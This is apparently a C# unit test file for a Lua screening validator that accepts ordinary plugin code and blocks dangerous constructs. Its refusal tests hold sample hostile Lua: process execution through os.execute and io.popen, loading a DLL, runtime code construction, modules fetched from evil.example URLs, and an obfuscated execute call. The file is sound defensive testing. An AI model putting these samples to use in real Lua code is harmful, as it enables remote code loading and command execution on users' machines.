using AwesomeAssertions;
using LuaToolsGui.Services;
using Xunit;

namespace LuaToolsGui.Tests;

/// <summary>
/// The application-code Lua screen, as opposed to <see cref="LuaManifestValidatorTests"/>.
///
/// <para>
/// This type exists because of a shipped false positive: 1.4.0 screened <c>plugin.zip</c> with the MANIFEST
/// rules, so installing BetterSteamTools failed with
/// <c>backend/main.lua: the lua contains 'require', which a Steam manifest never needs</c>. Correct about
/// manifests, nonsense about a plugin backend.
/// </para>
///
/// <para>
/// The bias here is heavier than usual toward false positives. Every construct wrongly refused is a plugin
/// that cannot be installed at all, and the residual risk is small: repository pinning and the fail-closed
/// digest already establish that the bytes are what the project published, and the same release ships a
/// DLL that steam.exe loads regardless. So the "ordinary Lua is accepted" block below is the load-bearing
/// half of this file, not filler.
/// </para>
/// </summary>
public class LuaCodeValidatorTests
{
    private static bool Rejected(string lua) => Screen(lua).Rejected;

    private static (bool Rejected, string? Reason) Screen(string lua)
    {
        var analysis = FixAnalyzer.AnalyzeLuaSource(lua, "backend/main.lua", LuaScreeningProfile.ApplicationCode);
        return (analysis.Blocked, analysis.BlockReason);
    }

    // ══ Ordinary Lua must be accepted ══════════════════════════════════════════

    [Fact]
    public void The_exact_construct_that_broke_bettersteamtools_is_accepted() =>
        Rejected("local utils = require(\"utils\")").Should()
            .BeFalse("require is how Lua loads a module; refusing it refuses every real plugin");

    [Theory]
    [InlineData("local m = require(\"backend.helpers\")")]
    [InlineData("require('./local_module')")]
    [InlineData("local ok, err = pcall(function() return doWork() end)")]
    [InlineData("setmetatable(obj, { __index = Base })")]
    [InlineData("local meta = getmetatable(obj)")]
    [InlineData("rawset(t, 'k', 1)  rawget(t, 'k')")]
    [InlineData("_G.LuaTools = LuaTools")]
    [InlineData("collectgarbage('collect')")]
    [InlineData("local f = io.open(configPath, 'r')")]
    [InlineData("local home = os.getenv('APPDATA')")]
    [InlineData("dofile('config.lua')")]
    [InlineData("local chunk = loadfile('module.lua')")]
    public void Ordinary_language_constructs_are_accepted(string lua) =>
        Rejected(lua).Should().BeFalse(
            "the manifest denylist refuses all of these, and every one of them is normal in a program");

    [Fact]
    public void A_realistic_plugin_backend_is_accepted()
    {
        const string lua = """
            local json = require("json")
            local utils = require("backend.utils")

            local M = {}
            M.__index = M

            function M.new(config)
                local self = setmetatable({}, M)
                self.config = config or {}
                return self
            end

            function M:load()
                local ok, data = pcall(function()
                    local f = io.open(self.config.path, "r")
                    if not f then return nil end
                    local raw = f:read("*a")
                    f:close()
                    return json.decode(raw)
                end)
                return ok and data or nil
            end

            return M
            """;

        Screen(lua).Rejected.Should().BeFalse();
    }

    [Fact]
    public void A_string_literal_load_is_accepted() =>
        Rejected("local f = load(\"return 1 + 1\")").Should()
            .BeFalse("the chunk is right there in the source and can be read");

    [Theory]
    [InlineData("function M:load() return self.data end")]      // method definition
    [InlineData("function M.load(path) return path end")]       // field definition
    [InlineData("local function load(path) return path end")]   // local definition
    [InlineData("obj:load(path)")]                              // method call
    [InlineData("self.load(config)")]                           // field call
    [InlineData("cache.load(key)")]
    [InlineData("local n = preload(x)")]                        // longer identifier
    public void A_method_or_function_named_load_is_not_the_global_load(string lua) =>
        Rejected(lua).Should().BeFalse(
            "'load' is an everyday method name; an unqualified bare load( is the only one that is Lua's global");

    [Fact]
    public void A_dangerous_name_only_in_a_comment_is_accepted() =>
        Rejected("-- never call os.execute here\nlocal x = 1").Should().BeFalse();

    [Fact]
    public void A_dangerous_name_inside_a_longer_identifier_is_accepted() =>
        Rejected("local n = studio.popenings").Should().BeFalse();

    [Fact]
    public void Escapes_in_ordinary_source_are_accepted() =>
        Rejected("local s = \"line\\n\\ttab\\x41\"\nprint(s)").Should()
            .BeFalse("a handful of escapes is not obfuscation");

    // ══ Genuinely dangerous constructs stay blocked ════════════════════════════

    [Theory]
    [InlineData("os.execute(\"calc.exe\")", "os.execute")]
    [InlineData("local h = io.popen(cmd)", "io.popen")]
    [InlineData("package.loadlib(\"evil.dll\", \"entry\")", "package.loadlib")]
    [InlineData("loadstring(payload)()", "loadstring")]
    public void Code_and_process_execution_is_refused(string lua, string construct)
    {
        var (rejected, reason) = Screen(lua);

        rejected.Should().BeTrue();
        reason.Should().Contain(construct);
    }

    [Fact]
    public void Building_code_at_runtime_is_refused() =>
        Screen("local f = load(decode(blob))").Reason.Should().Contain("builds code at runtime");

    [Theory]
    [InlineData("require(\"https://evil.example/mod.lua\")")]
    [InlineData("dofile('http://evil.example/x.lua')")]
    [InlineData("loadfile(\"https://evil.example/payload\")")]
    public void Loading_from_a_url_is_refused(string lua) =>
        Screen(lua).Reason.Should().Contain("from a URL");

    [Fact]
    public void Obfuscation_that_hides_a_dangerous_call_is_still_caught()
    {
        // The de-obfuscation pass runs against this profile too, so string-splitting does not get past it.
        var (rejected, reason) = Screen("_G[\"os\"][\"execute\"](\"calc\")");

        rejected.Should().BeTrue();
        reason.Should().Contain("hides a forbidden call");
    }

    [Fact]
    public void A_file_that_is_mostly_escapes_is_refused()
    {
        string blob = "local s = \"" + string.Concat(Enumerable.Repeat("\\x41", 400)) + "\"";

        Screen(blob).Reason.Should().Contain("mostly character escapes");
    }

    [Fact]
    public void A_long_file_with_a_few_escapes_is_not_mistaken_for_a_blob()
    {
        // The count threshold alone would not save this; the ratio is what does.
        string source = string.Concat(Enumerable.Repeat("local x = \"a\\n\"\n", 300));

        Rejected(source).Should().BeFalse("300 newline escapes in 300 lines of real code is ordinary");
    }

    [Fact]
    public void Matching_is_case_insensitive() =>
        Rejected("OS.EXECUTE('calc')").Should().BeTrue();

    [Fact]
    public void Empty_source_is_accepted() =>
        Rejected("").Should().BeFalse();
}
